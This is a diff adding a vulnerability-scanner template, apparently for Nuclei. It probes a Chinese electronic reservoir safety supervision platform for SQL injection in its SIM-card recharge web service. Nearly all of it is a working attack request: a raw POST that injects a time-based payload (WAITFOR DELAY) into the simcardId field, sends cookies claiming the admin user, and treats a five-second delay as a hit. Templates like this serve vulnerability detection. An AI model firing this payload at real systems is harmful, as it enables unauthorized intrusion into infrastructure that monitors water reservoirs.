@@ -1,0 +1,30 @@
+id: dzskjg-simcardId-sqli
+
+info:
+  name: dzskjg-simcardId-sqli
+  author: apple
+  severity: high
+  description: 某电子水库安全监管平台-存在sql注入漏洞
+  reference:
+    - https://github.com/Y1-K1NG/poc_exp/blob/main/20231228%E6%9F%90%E7%94%B5%E5%AD%90%E6%B0%B4%E5%BA%93%E5%AE%89%E5%85%A8%E7%9B%91%E7%AE%A1%E5%B9%B3%E5%8F%B0sql%E6%B3%A8%E5%85%A5/readme.md
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        POST /WebServices/SIMMaintainService.asmx/GetAllRechargeRecordsBySIMCardId HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: currentuser=username=admin; usercookiename=usernames=admin;
+        Content-Length: 57
+
+        loginIdentifer=123&simcardId=123';WAITFOR DELAY '0:0:5'--
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
